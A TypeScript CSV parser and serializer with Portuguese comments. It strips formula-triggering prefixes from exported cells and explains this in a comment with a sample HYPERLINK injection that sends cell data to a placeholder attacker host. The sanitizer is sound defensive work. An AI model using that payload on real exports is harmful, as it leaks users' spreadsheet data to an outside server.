/**
 * Parser e serializador CSV próprios.
 *
 * Escrito à mão de propósito: uma biblioteca de CSV custa dezenas de kB e amplia a
 * superfície de cadeia de suprimentos de um app que não tem backend. O que precisamos
 * — aspas, aspas escapadas, separador dentro de aspas, quebra de linha dentro de campo —
 * cabe em cem linhas auditáveis.
 *
 * Nada aqui usa `eval` ou construção dinâmica de função.
 */

/**
 * Caracteres que fazem o Excel e o Google Sheets interpretarem a célula como fórmula.
 * Ver docs/SECURITY.md §3.
 */
const PREFIXOS_PERIGOSOS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Neutraliza injeção de fórmula em CSV.
 *
 * Uma célula como `=HYPERLINK("http://atacante/"&A1,"clique")` exfiltra dados quando a
 * exportação é aberta no Excel. O apóstrofo à frente força o tratamento como texto.
 */
export function sanitizeCsvCell(valor: string): string {
  if (valor.length === 0) return valor;
  if (PREFIXOS_PERIGOSOS.includes(valor[0])) return `'${valor}`;
  return valor;
}

function escaparCampo(valor: unknown): string {
  if (valor === null || valor === undefined) return '';
  const texto = sanitizeCsvCell(String(valor));
  if (/[",\n\r]/.test(texto)) {
    return `"${texto.replace(/"/g, '""')}"`;
  }
  return texto;
}

export function paraCsv(linhas: Record<string, unknown>[], colunas?: string[]): string {
  if (linhas.length === 0) return colunas ? colunas.join(',') + '\n' : '';
  const cabecalho = colunas ?? Object.keys(linhas[0]);
  const corpo = linhas.map((linha) => cabecalho.map((c) => escaparCampo(linha[c])).join(','));
  return [cabecalho.join(','), ...corpo].join('\n') + '\n';
}

export interface LinhaCsv {
  /** Número da linha no arquivo original, contando o cabeçalho como linha 1. */
  numero: number;
  valores: Record<string, string>;
}

export interface ResultadoParse {
  cabecalho: string[];
  linhas: LinhaCsv[];
  /** Linhas com número de colunas diferente do cabeçalho. */
  linhasMalformadas: { numero: number; motivo: string }[];
}

/** Divide o texto CSV em campos, respeitando aspas. */
function dividirLinhas(texto: string): string[][] {
  const linhas: string[][] = [];
  let campos: string[] = [];
  let campo = '';
  let dentroDeAspas = false;
  let i = 0;

  // Remove BOM, comum em CSV exportado de ERP no Windows.
  const conteudo = texto.charCodeAt(0) === 0xfeff ? texto.slice(1) : texto;

  while (i < conteudo.length) {
    const c = conteudo[i];

    if (dentroDeAspas) {
      if (c === '"') {
        if (conteudo[i + 1] === '"') {
          campo += '"';
          i += 2;
          continue;
        }
        dentroDeAspas = false;
        i++;
        continue;
      }
      campo += c;
      i++;
      continue;
    }

    if (c === '"') {
      dentroDeAspas = true;
      i++;
      continue;
    }
    if (c === ',' || c === ';') {
      campos.push(campo);
      campo = '';
      i++;
      continue;
    }
    if (c === '\n' || c === '\r') {
      // Consome \r\n como uma única quebra.
      if (c === '\r' && conteudo[i + 1] === '\n') i++;
      campos.push(campo);
      linhas.push(campos);
      campos = [];
      campo = '';
      i++;
      continue;
    }
    campo += c;
    i++;
  }

  if (campo.length > 0 || campos.length > 0) {
    campos.push(campo);
    linhas.push(campos);
  }

  return linhas.filter((l) => !(l.length === 1 && l[0].trim() === ''));
}

export function deCsv(texto: string): ResultadoParse {
  const bruto = dividirLinhas(texto);
  if (bruto.length === 0) {
    return { cabecalho: [], linhas: [], linhasMalformadas: [] };
  }

  const cabecalho = bruto[0].map((c) => c.trim());
  const linhas: LinhaCsv[] = [];
  const linhasMalformadas: { numero: number; motivo: string }[] = [];

  for (let i = 1; i < bruto.length; i++) {
    const campos = bruto[i];
    const numero = i + 1;

    if (campos.length !== cabecalho.length) {
      linhasMalformadas.push({
        numero,
        motivo: `Esperadas ${cabecalho.length} colunas, encontradas ${campos.length}.`,
      });
      continue;
    }

    const valores: Record<string, string> = {};
    cabecalho.forEach((coluna, indice) => {
      valores[coluna] = campos[indice].trim();
    });
    linhas.push({ numero, valores });
  }

  return { cabecalho, linhas, linhasMalformadas };
}

/** Dispara o download de um arquivo gerado no cliente. Nada sai do dispositivo. */
export function baixarArquivo(nome: string, conteudo: string, tipo = 'text/csv;charset=utf-8') {
  const blob = new Blob([conteudo], { type: tipo });
  const url = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = nome;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
}
